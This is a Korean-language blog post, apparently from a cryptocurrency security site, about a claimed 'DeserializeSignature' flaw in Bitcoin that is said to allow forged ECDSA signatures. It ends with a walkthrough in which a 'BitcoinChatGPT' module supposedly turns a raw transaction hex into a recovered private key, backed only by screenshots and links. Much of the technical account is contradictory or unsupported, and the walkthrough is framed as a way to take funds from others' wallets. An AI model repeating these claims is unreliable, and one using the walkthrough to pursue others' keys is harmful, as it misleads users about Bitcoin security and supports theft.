# 비트코인 네트워크의 DeserializeSignature 취약성 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성

<!-- wp:image {"id":5188} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/053-2-1024x576.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5188"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>본 연구에서는 공격자가 비트코인 ​​네트워크에서 유효하지 않은 ECDSA 서명을 생성할 수 있게 해주는 DeserializeSignature 취약점을 살펴보겠습니다. 암호화에서 ECDSA 디지털 서명은 디지털 메시지나 문서의 신뢰성을 증명할 수 있는 수학적 체계입니다. 비트코인 네트워크에서는 서명을 사용하여 거래를 승인하고 특정 금액의 비트코인 ​​소유자가 실제로 전송에 동의했음을 확인합니다. 그러나&nbsp;<a href="https://attacksafe.ru/bip-schnorrrb"><em>2023년에 발견된</em></a>&nbsp;기능의 취약점으로&nbsp;<code>DeserializeSignature</code>인해&nbsp;공격자는 네트워크에서 유효한 것으로 받아들여질 수 있는 잘못된 서명을 생성할 수 있었습니다.<a href="https://attacksafe.ru/bip-schnorrrb"><em></em></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">DeserializeSignature 작동 방식</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DeserializeSignature 함수는 디지털 서명을 유효성을 확인하는 데 사용할 수 있는 객체로 역직렬화(바이트 시퀀스에서 변환)하는 역할을 합니다. 이 함수는 비트코인에서 사용되는 공개 키 암호화 표준(ECDSA)을 준수하는 특정 데이터 형식을 기대합니다. DeserializeSignature 함수는 트랜잭션 서명을 가져와 계산 결과로 얻은 해시와의 일관성을 확인합니다. 서명이 유효하면 DeserializeSignature는 를 반환하고&nbsp;<code>true</code>, 그렇지 않으면 를 반환합니다&nbsp;<code>false</code>. 취약점의 본질은 DeserializeSignature가 역직렬화하기 전에 모든 서명 매개변수의 정확성을 확인하지 않았다는 것입니다. 특히, 이 함수는 서명의 "R" 또는 "S" 값이 null인지 여부를 확인하지 않았습니다. 이로 인해 공격자는 무효성에도 불구하고 일부 비트코인 ​​클라이언트에서 올바른 것으로 받아들일 수 있는 null 값을 사용하여 서명을 생성할 수 있었습니다. 공격자는 잘못된 데이터와 함께 DeserializeSignature 함수에 전달되는 경우 유효한 것으로 승인되는 가짜 트랜잭션 서명을 생성할 수 있습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">잠재적 위협 및 공격 사례</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>이 취약점은 비트코인 ​​네트워크의 보안에 심각한 위협을 가했습니다. 공격자는 이를 다음과 같은 목적으로 사용할 수 있습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><strong>비트코인 도난:</strong>  공격자는 유효하지 않은 서명을 생성함으로써 비트코인을 다른 사람의 지갑에서 자신의 지갑으로 전송하는 거래를 승인할 수 있습니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>이중 지출:</strong>  null 값을 가진 서명을 사용하여 동일한 비트코인으로 두 개의 다른 거래를 생성할 수 있습니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>블록체인 내 데이터 조작:</strong> 공격자는 가짜 거래를 생성할 수 있으며, 이 거래의 서명은 올바른 것으로 받아들여지며 이를 블록체인에 추가할 수 있습니다. 이로 인해 계정 잔액이 변경될 수 있습니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>거래 확인 시스템에 대한 공격:</strong> 공격자는 가짜 거래 서명을 생성하여 확인을 위해 네트워크로 보낼 수 있습니다.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">DeserializeSignature 프로세스</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DeserializeSignature는 일련의 바이트를 트랜잭션을 인증하는 데 사용할 수 있는 데이터 구조로 변환하는 프로세스입니다. 비트코인의 맥락에서 서명은 ECDSA(타원 곡선 디지털 서명 알고리즘) 알고리즘을 사용하여 생성되며 r과 s라는 두 가지 구성 요소를 포함합니다. 암호화폐의 맥락에서 서명은 거래의 진위를 확인하고 무결성을 보장하는 데 사용됩니다. DeserializeSignature 취약점은 공격자가 역직렬화 프로세스를 조작하여 서명 데이터를 변경하거나 위조할 수 있을 때 발생합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/8E2KJeWu4XA?si=bhCMFNyyxcXGNiTd" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">역직렬화 단계:</h3>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>데이터 읽기: 첫 번째 단계는 서명을 나타내는 바이트 시퀀스를 읽는 것입니다. 이 데이터는 일반적으로 DER(Distinguished Encoding Rules) 형식으로 저장됩니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>형식 확인: 바이트 시퀀스가 ​​예상 DER 형식과 일치하는지 확인합니다. 여기에는 데이터의 길이와 구조를 확인하는 것이 포함됩니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>구성 요소 추출: r 및 s 구성 요소는 바이트 시퀀스에서 추출됩니다. 이러한 구성 요소는 서명을 확인하는 데 사용되는 정수입니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>값 검증: r과 s의 값이 허용 가능한 한도 내에 있는지 확인합니다. 이는 서명 위조 공격을 방지하는 데 중요합니다.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">잠재적인 실패 지점</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature</strong>&nbsp;프로세스는&nbsp;다양한 공격과 버그에 취약할 수 있습니다. 주요 잠재적 실패 지점을 살펴보겠습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. 잘못된 형식 확인</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DER 형식 유효성 검사가 올바르게 수행되지 않으면 유효하지 않은 서명이 유효한 것으로 간주될 수 있습니다. 이로 인해 공격자는 서명을 위조하고 무단 거래를 할 수 있습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. 라이브러리의 취약점</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>취약한 역직렬화 라이브러리를 사용하면 버퍼 오버플로 또는 임의 코드 실행과 같은 다양한 공격이 발생할 수 있습니다. 서명 작업을 위해서는 테스트되고 업데이트된 라이브러리를 사용하는 것이 중요합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. 가치 확인이 부족함</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>r 및 s 값이 제대로 확인되지 않으면 공격자가 잘못된 값을 사용하여 위조된 서명을 생성할 수 있습니다. 예를 들어, r과 s의 값은 1과 n-1 사이여야 합니다. 여기서 n은 타원 곡선의 차수입니다.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. 런타임 공격</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>일부 공격은 역직렬화 작업의 실행 시간 분석을 기반으로 할 수 있습니다. 실행 시간이 r과 s의 값에 따라 달라지면 공격자가 개인 키에 대한 정보를 얻을 수 있습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>다음으로, 비트코인 ​​시스템의 DeserializeSignature 프로세스의 취약점에 대한 연구 결과를 살펴보고, 취약점의 메커니즘, 잠재적 결과 및 제안된 완화 방법도 살펴보겠습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">암호화폐 보안에 미치는 영향</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature</strong>&nbsp;취약점은&nbsp;다음과 같은 여러 가지 이유로 암호화폐 보안에 심각한 위협을 가합니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>자금 손실: 공격자는 취약점을 이용하여 사용자 지갑에서 자금을 훔칠 수 있습니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>신뢰 약화: 성공적인 공격은 암호화폐 보안에 대한 사용자의 신뢰를 약화시켜 암호화폐 채택 및 사용에 부정적인 영향을 미칠 수 있습니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>탐지하기 어려움: DeserializeSignature 취약점을 악용하는 공격은 탐지 및 예방이 어려워 특히 위험합니다.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">DeserializeSignature 취약점으로부터 보호하는 방법</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature</strong>&nbsp;취약점 으로부터 보호하려면&nbsp;다음 조치를 취해야 합니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>데이터 유효성 검사: 역직렬화 단계에서 엄격한 데이터 검사를 구현하여 조작을 방지합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>소프트웨어 업데이트: 암호화폐 시스템과 지갑을 정기적으로 업데이트하여 알려진 취약점을 제거합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>보안 감사: 정기적인 보안 감사를 실시하여 잠재적인 취약점을 식별하고 해결합니다.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">연구의 주요 목적</h2>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>취약점 식별: 공격에 취약할 수 있는 DeserializeSignature 프로세스의 특정 측면을 식별합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>취약성 분석: 식별된 취약성이 비트코인 ​​네트워크 보안에 미치는 잠재적 영향을 평가합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>기존 보안 방법 검토: DeserializeSignature 프로세스를 보호하는 데 사용되는 현재 방법과 접근 방식을 검토합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>권장사항 개발: 보안을 개선하고 공격 가능성을 방지하기 위한 조치를 제안합니다.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">방법론 및 취약점 식별</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>비트코인의 DeserializeSignature 프로세스에는 데이터를 한 형식에서 다른 형식으로 변환하는 작업이 포함됩니다. 이 과정에서 공격자가 공격을 시작하는 데 사용할 수 있는 오류가 발생할 수 있습니다. 이 단계의 주요 작업은 역직렬화 프로세스의 특정 취약점을 식별하는 것입니다. 취약점 암호 분석: 취약점을 식별한 후 이에 대한 자세한 분석을 수행해야 합니다. 여기에는 비트코인 ​​네트워크의 보안에 대한 잠재적 영향을 평가하고 가능한 공격 시나리오를 검토하는 것이 포함됩니다. 공격자가 자신의 목적을 위해 이 취약점을 어떻게 악용할 수 있는지 이해하는 것이 중요합니다. 기존 보안 방법 검토: 이 연구 단계에서는 DeserializeSignature 프로세스를 보호하는 데 사용되는 현재 방법과 접근 방식을 검토합니다. 이를 통해 우리는 기존 조치가 얼마나 효과적인지, 어떤 조치를 개선할 수 있는지 판단할 수 있습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>확인된 취약점을 제거하기 위해 다음과 같은 몇 가지 조치가 제안됩니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>업데이트된 역직렬화 알고리즘: DeserializeSignature 단계에서 더욱 엄격한 검사 및 데이터 유효성 검사를 구현합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>테스트 수준 향상: 다양한 공격 시나리오를 활용하여 정기적인 보안 테스트를 수행합니다.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>개발자 교육: 가능한 취약점과 이를 방지하는 방법에 대한 개발자의 인식이 높아졌습니다.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>앞서 비트코인에서 사용되는 타원곡선 디지털 서명 알고리즘(ECDSA)의 취약점에 대한 연구가 진행된 바 있다. 이러한 연구에 따르면 ECDSA를 부적절하게 구현하면 개인 키가 유출될 수 있는 것으로 나타났습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature</strong>&nbsp;취약점 과 달리&nbsp;ECDSA 문제는 데이터 처리 프로세스가 아닌 알고리즘의 수학적 측면과 관련이 있습니다. 다른 연구에서는 P2P(Peer-to-Peer) 비트코인 ​​네트워크의 취약성에 중점을 두었습니다. 이러한 취약점에는&nbsp;<strong>이중 지출</strong>&nbsp;및&nbsp;<strong>시빌 공격이</strong>&nbsp;포함되었습니다 .&nbsp;<strong>DeserializeSignature</strong>&nbsp;취약점 과 달리&nbsp;이러한 문제는 네트워킹 측면 및 네트워크 노드의 상호 작용과 관련이 있으며 암호화 데이터 처리와는 관련이 없습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>DeserializeSignature 취약점과 이전 연구의 주요 차이점은 문제의 성격입니다. DeserializeSignature 취약점은 데이터 처리 취약점이며 데이터 역직렬화 및 유효성 검사 기술을 개선하여 해결할 수 있습니다. ECDSA 및 P2P 네트워크의 취약점으로 인해 알고리즘 및 네트워크 프로토콜에 더 큰 변화가 필요합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>또한 DeserializeSignature 취약점은 임의 코드를 실행하고 시스템을 손상시키는 데 사용될 수 있으므로 사용자 보안에 더 즉각적인 영향을 미칩니다. ECDSA 및 P2P 네트워크의 취약점으로 인해 더 복잡한 공격이 필요할 수 있으며 더 간접적인 결과를 초래할 수 있습니다. 최근 몇 년 동안 비트코인과 같은 암호화폐는 금융 생태계의 중요한 부분이 되었습니다. 그러나 인기가 높아짐에 따라 식별된 취약점의 수도 증가합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">가짜 ECDSA 서명</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">BitcoinChatGPT 기계 학습 프로세스를 사용하여 잘못된 ECDSA 서명 생성</h3>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://bitcoinchatgpt.org/deserializesignature-vulnerability-algorithm/" target="_blank" rel="noreferrer noopener">BitcoinChatGPT</a></strong>&nbsp;모듈을 &nbsp;사용하는&nbsp; 취약한&nbsp;<strong><a href="https://en.bitcoin.it/wiki/Raw_transactions">원시</a></strong>&nbsp;트랜잭션 의 구조를 구축하는 것을 고려해 보겠습니다.&nbsp;</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/i0qchOojI0g?si=uVXaIQiEUrKApLd5" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Google Colab 버전을 열어보겠습니다.</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa#scrollTo=B8ueObMAt5Q9&amp;line=1&amp;uniqifier=1">https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa#scrollTo=B8ueObMAt5Q9&amp;line=1&amp;uniqifier=1</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>State of a vulnerable transaction in Bitcoin:

01000000
....01
........0dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935
............00000000
........8b483045
....0221
....00
........b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
....0220
........74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
....0141
045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5b
....ffffffff
01
....d204000000000000
........1976
............a914
........d74b32dfa340da479ce64aaf5e326496eb3995f1
....88ac
00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>모든 출력 값을 하나의 공통 라인으로 결합해 보겠습니다.</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong></strong><strong><a href="https://live.blockcypher.com/btc/decodetx" target="_blank" rel="noreferrer noopener">BlockCypher의 "Decode A Transaction"</a></strong><strong>&nbsp;옵션을 열어 보겠습니다&nbsp;</strong><em>.</em><em>&nbsp;</em><strong><a href="https://live.blockcypher.com/btc/decodetx" target="_blank" rel="noreferrer noopener"></a></strong><em></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://live.blockcypher.com/btc/decodetx">https://live.blockcypher.com/btc/decodetx</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5108} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-1024x505.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5108"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>취약한 원시 비트코인 ​​거래를 디코딩한 후 다음과 같은 결과를 얻습니다.</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>{
    "addresses": &#91;
        "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK",
        "1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk"
    ],
    "block_height": -1,
    "block_index": -1,
    "confirmations": 0,
    "double_spend": false,
    "fees": 2606688996428,
    "hash": "32361b5b8aa2954519c171b45dfa14ee5d997dc0a89182ebea4a9eaa15429f1e",
    "inputs": &#91;
        {
            "addresses": &#91;
                "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK"
            ],
            "age": 344419,
            "output_index": 0,
            "output_value": 2606688997662,
            "prev_hash": "35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d"
.......
.......
.......</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Bitcoin HASH160에 주목합시다:&nbsp;&nbsp;</em><strong>d74b32dfa340da479ce64aaf5e326496eb3995f1</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5112} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-1.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5112"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/f0421962be80403bb1b0877eace2c7eb70eb85bd/32DeserializeSignatureVulnerability/DecodeRawTX.txt#L31">https://github.com/demining/CryptoDeepTools/blob/f0421962be80403bb1b0877eace2c7eb70eb85bd/32DeserializeSignatureVulnerability/DecodeRawTX.txt#L31</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>BitcoinChatGPT는 공개 키를 사용하여 거래 구조를 생성합니다&nbsp;<code><strong>HASH</strong></code>. 여기서 비트코인 ​​주소:&nbsp;<a href="https://live.blockcypher.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/" target="_blank" rel="noreferrer noopener">1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a><strong><code>1234 satoshi</code></strong>&nbsp;는 네트워크 내의 동일한 주소로&nbsp;전송됩니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://live.blockcypher.com/widget/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/received">https://live.blockcypher.com/widget/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/received</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5116} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-2-1024x367.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5116"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py" target="_blank" rel="noreferrer noopener"><strong>Bitcoin HASH160은 Python 스크립트: wif_to_hash160.py를</strong></a>&nbsp;사용하여 획득했습니다.<a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5117} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-3.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5117"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/VulnerableRawTX.txt" target="_blank" rel="noreferrer noopener"><strong>취약한RawTX.txt</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5118} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-4-1024x689.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5118"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py">https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>질문 답변:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5119} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-5-1024x456.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5119"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5120} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-6-1024x351.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5120"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5121} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-7-1024x430.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5121"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5122} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-8-1024x275.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5122"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>궁극적으로&nbsp;<strong>BitcoinChatGPT 모듈은&nbsp;</strong><strong>KEYFOUND.privkey</strong>&nbsp;파일에 대한 응답을 출력하여&nbsp;개인 키를 가장 많이 사용되는 두 가지 형식인&nbsp;<strong>HEX 및 WIF 로 저장합니다.</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5123} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-9-1024x677.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5123"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey">https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://youtu.be/NNFv08QlDZk" target="_blank" rel="noreferrer noopener">BitcoinChatGPT #2 DeserializeSignature 취약점 알고리즘</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/NNFv08QlDZk?si=kzowhQ7vBYKwlViE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
